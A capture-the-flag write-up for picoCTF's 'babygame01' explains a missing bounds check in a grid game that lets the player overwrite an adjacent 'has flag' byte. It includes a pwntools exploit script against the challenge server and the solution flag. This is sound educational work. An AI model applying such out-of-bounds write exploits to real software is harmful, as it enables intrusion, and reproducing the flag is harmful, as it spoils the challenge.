# babygame01

## Challenge

The challenge is a game with grid that the player can move around in.

The initial state of the game is as follows:

```
Player position: 4 4
End tile position: 29 89
Player has flag: 0
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```

We can move around by sending 'w', 'a', 's', and 'd'.

If we reach the 'X' in the bottom right, the game prints "You win!" and exits.

## Solution

By reverse engineering the game binary, we can find two other secret commands.

'l' will change our player character to the next character we send.
For example, sending 'l' followed by 'A' will cause our character to appear as an 'A'.

'p' will automatically move our character to the 'X' in the bottom right of the grid, ending the game.

We can also see the condition for printing the flag.
The flag will be printed when we reach the 'X' if the value labeled by "Player has flag" is not 0.

The player struct contains two integers, used to store the player coordinates, and a byte, used to store the "Player has flag" value.

The grid is a 2-dimensional byte array which stores the characters to be printed.

When the player moves, the previous position is set to a '.' and the new position is set to our player character, which is a '@' by default.

The vulnerability is that there are no bounds checks on where we can move.
We move out of bounds of the grid, allowing us to write our player character out of bounds.
When we move away, our previous location is still replaced with a '.'.

The player struct is located next to the start of the grid.
If we move our player to the top left of the grid, then 4 steps to the left, we will occupy the same space as the "Player has flag" value.
We can then use the 'p' command to automatically move our player to the 'X'.
The "Player has flag" variable will be set to a '.', which will pass the non-zero check and print the flag once we reach the 'X'.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 56693 game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 56693)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

x = 4
y = 4

while y > 0:
    io.send(b'w')
    y -= 1

while x > -4:
    io.send(b'a')
    x -= 1

io.sendline(b'p')

io.interactive()
```

## Flag

```
picoCTF{gamer_m0d3_enabled_0a880baf}
```
